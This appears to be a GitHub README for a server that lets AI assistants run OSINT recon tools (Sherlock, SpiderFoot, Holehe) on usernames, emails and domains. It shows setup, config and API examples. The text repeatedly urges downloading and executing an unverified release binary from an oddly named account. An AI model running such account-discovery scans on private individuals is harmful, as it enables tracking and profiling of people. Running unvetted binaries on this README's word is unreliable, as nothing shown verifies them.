https://github.com/12345678969696969/osint-tools-mcp-server/releases

# OSINT MCP Server — Expose Recon Tools to AI Assistants

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/12345678969696969/osint-tools-mcp-server/releases)  
[![ai](https://img.shields.io/badge/topic-ai-lightgrey?style=flat-square)](https://github.com/topics/ai) [![claude](https://img.shields.io/badge/topic-claude-lightgrey?style=flat-square)](https://github.com/topics/claude) [![osint](https://img.shields.io/badge/topic-osint-lightgrey?style=flat-square)](https://github.com/topics/osint) [![mcp](https://img.shields.io/badge/topic-mcp-lightgrey?style=flat-square)](https://github.com/topics/mcp) [![recon](https://img.shields.io/badge/topic-recon-lightgrey?style=flat-square)](https://github.com/topics/reconnaissance)

Hero image  
![Recon Hero](https://images.unsplash.com/photo-1518770660439-4636190af475?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop&crop=faces)

A server that exposes a set of OSINT tools behind a simple MCP-compatible API. Use this server to let AI assistants like Claude call recon and investigation tools in a controlled way. The server bundles wrappers for common open-source tools and provides REST and MCP endpoints. It runs as a standalone binary or a container.

Status: stable for lab use. Use the Releases page to download the packaged binary or image and run it. Download the release asset and execute the server binary for your platform by following the commands in the release notes: https://github.com/12345678969696969/osint-tools-mcp-server/releases

Features
- Expose multiple OSINT tools via MCP and HTTP.
- Normalize results into JSON for AI consumption.
- Run tool jobs in sandboxes and return structured output.
- Rate limit and queue requests per client key.
- Simple plugin layout to add new tools.
- Metrics and logs for audit and debugging.
- Docker and bare-binary deployment.

Why this repo
- Combine popular OSINT tools behind one API.
- Let assistants call recon tools without shell access.
- Keep tool behavior consistent and parse results for further analysis.

Supported tools (examples)
- Sherlock — username lookup across platforms.
- SpiderFoot — large-scale surface mapping.
- Holehe — account existence checks via email.
- Custom fingerprinting modules for domains, IPs, and social profiles.
Each tool runs in an adapter that maps inputs and outputs to a common schema.

Quick architecture
- HTTP API + MCP listener
- Worker pool for tool execution
- Tool adapters (Python, Go, shell)
- Storage for job state and results (SQLite by default)
- Access control and API keys

Getting started

Prerequisites
- Linux, macOS, or Windows.
- Docker (optional).
- An API key for external tools where needed (e.g., Shodan, VirusTotal).

Download and run (binary)
- Visit the Releases page and download the appropriate package. The release contains the server binary and example configs. Download the release asset and execute the binary for your platform. See the release notes for exact filenames and checksums: https://github.com/12345678969696969/osint-tools-mcp-server/releases
- Example:
  - chmod +x osint-mcp-server-linux
  - ./osint-mcp-server-linux --config config.yml
- The server starts on port 8080 by default.

Run with Docker
- Pull the image from a registry (see release notes for tags) or build locally:
  - docker build -t osint-mcp-server .
  - docker run -p 8080:8080 -v ./config.yml:/app/config.yml osint-mcp-server
- The container exposes the same endpoints.

Configuration (config.yml)
- server:
  - host: 0.0.0.0
  - port: 8080
- storage:
  - type: sqlite
  - path: data/db.sqlite
- auth:
  - api_keys:
    - key: your-key-1
      rate_limit: 10/m
- tools:
  - sherlock:
    - path: /usr/local/bin/sherlock
    - timeout: 60
  - spiderfoot:
    - mode: local
    - api_key: your-spiderfoot-key
- logging:
  - level: info
  - file: logs/server.log

Endpoints

MCP endpoint
- Host an MCP listener compatible with assistant connectors.
- Use the MCP protocol to call these methods:
  - recon.run_tool
    - params: tool_name, target, options
    - returns: job_id
  - recon.get_result
    - params: job_id
    - returns: status, output
- The server uses JSON-RPC style messages over the MCP channel.

HTTP API
- POST /api/v1/run
  - JSON: { "tool": "sherlock", "target": "alice" }
  - Response: { "job_id": "abc123", "status": "queued" }
- GET /api/v1/result/{job_id}
  - Response: { "job_id": "abc123", "status": "done", "result": {...} }
- GET /health
  - Response: { "status": "ok", "uptime": 12345 }

Tool adapters
- Each tool adapter isolates the tool process and maps raw output to JSON.
- Adapters include parsers for common tools:
  - Sherlock adapter parses profile links and availability.
  - Holehe adapter extracts provider, result, and confidence.
  - SpiderFoot adapter maps modules and module output fields.
- Add adapters by following the adapter template in /adapters/template.

Job lifecycle
- Submit job via MCP or HTTP.
- Server validates input and enqueues job.
- Worker picks job and runs tool adapter.
- Server stores raw logs and normalized JSON.
- Result becomes available via API or MCP callback.

Security model
- API keys restrict access and set limits per client.
- Jobs run in a sandbox. The sandbox isolates file I/O and network scope.
- You can restrict which tools a key can call.
- Audit logs record command input, outputs, and user ID.

Best practices for AI assistants
- Ask for permission before running any global scans.
- Provide a short scope for recon jobs.
- Use the normalized JSON output for follow-up prompts.
- Avoid chaining high-impact modules without human review.

Examples

Sherlock example (HTTP)
- Request:
  - POST /api/v1/run
  - Body: { "tool": "sherlock", "target": "alice", "options": { "timeout": 30 } }
- Response:
  - { "job_id": "job_001", "status": "queued" }
- Poll:
  - GET /api/v1/result/job_001
  - { "job_id": "job_001", "status": "done", "result": { "username": "alice", "platforms": [ { "site": "twitter", "found": true, "url": "https://twitter.com/alice" } ] } }

Holehe example (MCP)
- Call recon.run_tool with params:
  - tool_name: holehe
  - target: alice@example.com
- The adapter returns provider checks and a confidence field.

SpiderFoot example (large scan)
- Start a SpiderFoot job with limited modules.
- Use include/exclude lists to narrow the scan.
- Retrieve findings and map them to entities for the assistant to summarize.

Logging and metrics
- The server emits logs to stdout and a file.
- Metrics endpoint /metrics exposes counters and latencies in Prometheus format.
- Track per-key request counts, job durations, and failures.

Extending the server
- Add a new tool adapter:
  - Copy adapters/template to adapters/<tool-name>.
  - Implement parse_raw_output and map_to_schema functions.
  - Add a config block in config.yml.
  - Register the adapter in the adapter registry.
- Add new MCP methods by adding handler files in /mcp_handlers.

Testing
- Unit tests live in /tests.
- Integration tests simulate MCP calls and run adapters with sample data.
- Run tests:
  - go test ./... (or use the included test script)

Deployment tips
- Run behind a reverse proxy for TLS termination.
- Use a process manager to restart on crash.
- Mount persistent storage for job data and logs.
- Use a separate machine or VM for high-volume scanning.

Common issues
- Tool binary not found: check adapter path and permissions.
- Job times out: increase tool timeout in config or reduce target size.
- High queue time: increase worker_pool_size or add nodes.

Contributing
- Fork the repo, add a feature branch, and open a pull request.
- Follow the adapter template for new tool integrations.
- Add tests for new features.
- Keep changes small and focused.

Community and resources
- Follow the releases page for binaries and updates: https://github.com/12345678969696969/osint-tools-mcp-server/releases
- Join the issue tracker for bugs and feature requests.
- Share adapters and configs in PRs.

Licensing and credits
- License: MIT by default (see LICENSE file).
- Tool integrations use the upstream tool licenses.
- Credits:
  - Sherlock — username mapping
  - SpiderFoot — surface mapping
  - Holehe — email checks

Screenshots and diagrams
- Architecture diagram  
  ![Architecture](https://raw.githubusercontent.com/github/explore/main/topics/architecture/architecture.png)
- Example output screenshot  
  ![Output](https://images.unsplash.com/photo-1492724441997-5dc865305da7?ixlib=rb-4.0.3&q=80&w=1200&auto=format&fit=crop)

Roadmap
- Add more adapters for common OSINT tools.
- Add per-tool sandbox profiles.
- Add plugin marketplace for community adapters.
- Improve MCP native bindings for more connectors.

Changelog
- See the Releases page for packaged builds and checksums: https://github.com/12345678969696969/osint-tools-mcp-server/releases

Contact
- Open an issue for bugs or feature ideas.
- Use pull requests for code contributions.